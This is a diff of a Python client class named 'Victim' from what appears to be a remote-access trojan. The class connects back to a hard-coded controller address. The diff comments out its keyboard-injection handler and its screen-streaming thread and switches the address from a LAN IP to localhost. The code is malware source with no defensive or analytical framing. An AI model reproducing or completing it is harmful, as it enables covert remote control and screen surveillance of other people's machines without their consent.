@@ -2,12 +2,11 @@ import socket
 import sys
 import threading
 
-from modoules.screen_mirroring.screen_stream import ScreenStream
+# from modoules.screen_mirroring.screen_stream import ScreenStream
 
-sys.path.append('')
-
-from modoules.handelrs.keyboard_handelr import HandelKeyboard
-from modoules.protocol.protocol import HandelPacket, PacketType
+#
+# from modoules.handelrs.keyboard_handelr import HandelKeyboard
+# from modoules.protocol.protocol import HandelPacket, PacketType
 
 
 class Victim:
@@ -19,29 +18,29 @@ class Victim:
         self.victim = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connected = True
 
-    def handel(self):
-        while self.connected:
-            packet_type, packet_payload = HandelPacket.recv_packet(self.victim)
+    # def handel(self):
+    #     while self.connected:
+    #         packet_type, packet_payload = HandelPacket.recv_packet(self.victim)
+    #
+    #         if packet_type == PacketType.KEYBOARD.value:
+    #             HandelKeyboard.handel(packet_payload)
 
-            if packet_type == PacketType.KEYBOARD.value:
-                HandelKeyboard.handel(packet_payload)
-
-    def stream(self):
-        ScreenStream.transmit_frames(self.victim)
+    # def stream(self):
+    #     ScreenStream.transmit_frames(self.victim)
 
     def main(self):
 
         try:
             self.victim.connect(self.ADDR)
 
-            handel_thread = threading.Thread(target=self.handel)
-            stream_thread = threading.Thread(target=self.stream)
-
-            handel_thread.start()
-            stream_thread.start()
-
-            handel_thread.join()
-            stream_thread.join()
+            # handel_thread = threading.Thread(target=self.handel)
+            # stream_thread = threading.Thread(target=self.stream)
+            #
+            # handel_thread.start()
+            # stream_thread.start()
+            #
+            # handel_thread.join()
+            # stream_thread.join()
 
         except Exception as e:
             print(e)
@@ -52,4 +51,4 @@ class Victim:
 
 
 if __name__ == '__main__':
-    Victim('192.168.1.108', 3333).main()
+    Victim('localhost', 2221).main()
